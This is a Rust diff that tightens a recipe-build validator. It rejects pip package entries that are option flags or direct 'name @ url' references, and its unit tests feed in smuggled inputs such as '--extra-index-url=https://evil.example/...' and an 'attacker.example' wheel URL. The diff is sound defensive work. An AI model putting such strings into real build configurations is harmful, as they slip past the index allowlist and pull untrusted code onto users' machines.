@@ -342,6 +342,24 @@ fn validate_recipe_build(
             "a Remote recipe's build.pip must not use a -r requirements file (its contents cannot be version-pinned or index-allowlisted)"
         );
         for package in &step.packages {
+            // A `name @ url` direct reference makes pip install from `url` and
+            // ignore the index entirely, so it cannot be index-allowlisted; the
+            // `==` inside the url would also spuriously satisfy the version-pin
+            // check below. Reject it before that check (on the pre-marker
+            // portion, since a marker may legitimately contain '@').
+            let requirement = package.split(';').next().unwrap_or(package);
+            // An option-shaped entry (a PEP 508 requirement never starts with
+            // '-') smuggles a pip flag through `packages`: pip's optparse reads
+            // `--extra-index-url=URL` as a real option, redirecting to an
+            // un-allowlisted index. Reject any leading-dash token outright.
+            anyhow::ensure!(
+                !requirement.trim_start().starts_with('-'),
+                "a Remote recipe's build.pip package must be a requirement, not a pip option/flag (got {package:?})"
+            );
+            anyhow::ensure!(
+                !requirement.contains('@'),
+                "a Remote recipe's build.pip must not use a direct URL/path reference ('name @ url'); it bypasses the index allowlist (got {package:?})"
+            );
             anyhow::ensure!(
                 requirement_is_version_pinned(package),
                 "a Remote recipe's build.pip must version-pin every package (got {package:?})"
@@ -1361,6 +1379,57 @@ mod tests {
         assert!(
             validate_recipe_build(&with_requirements, RecipeProvenance::Installed, true).is_ok()
         );
+    }
+
+    #[test]
+    fn remote_recipe_rejects_direct_url_reference() {
+        // A `name @ url` direct reference makes pip install from the url and
+        // ignore the allowlisted index; the `==` inside the url would also
+        // spuriously satisfy the version-pin check, so it must be rejected.
+        let direct_ref = recipe::Build {
+            pip: vec![recipe::PipInstall {
+                packages: vec!["evil @ https://attacker.example/evil==1.0.whl".to_string()],
+                ..recipe::PipInstall::default()
+            }],
+            ..recipe::Build::default()
+        };
+        assert!(validate_recipe_build(&direct_ref, RecipeProvenance::Remote, true).is_err());
+        // A normal version-pinned package and an extras+marker spec still pass.
+        let normal = recipe::Build {
+            pip: vec![recipe::PipInstall {
+                packages: vec![
+                    "pkg==1.0".to_string(),
+                    "pkg[extra]==1.0 ; os_name == 'posix'".to_string(),
+                ],
+                ..recipe::PipInstall::default()
+            }],
+            ..recipe::Build::default()
+        };
+        assert!(validate_recipe_build(&normal, RecipeProvenance::Remote, true).is_ok());
+    }
+
+    #[test]
+    fn remote_recipe_rejects_option_shaped_package() {
+        // An option-shaped `packages` entry smuggles a pip flag: pip's optparse
+        // reads `--extra-index-url=URL` as a real option (the trailing `==`
+        // satisfies the version-pin check), redirecting to an un-allowlisted
+        // index. A leading-dash token must be rejected before that check.
+        for smuggled in [
+            "--extra-index-url=https://evil.example/s==1.0",
+            "--index-url=https://evil.example/s==1.0",
+        ] {
+            let build = recipe::Build {
+                pip: vec![recipe::PipInstall {
+                    packages: vec![smuggled.to_string()],
+                    ..recipe::PipInstall::default()
+                }],
+                ..recipe::Build::default()
+            };
+            assert!(
+                validate_recipe_build(&build, RecipeProvenance::Remote, true).is_err(),
+                "{smuggled:?} should be rejected for a Remote recipe"
+            );
+        }
     }
 
     #[test]
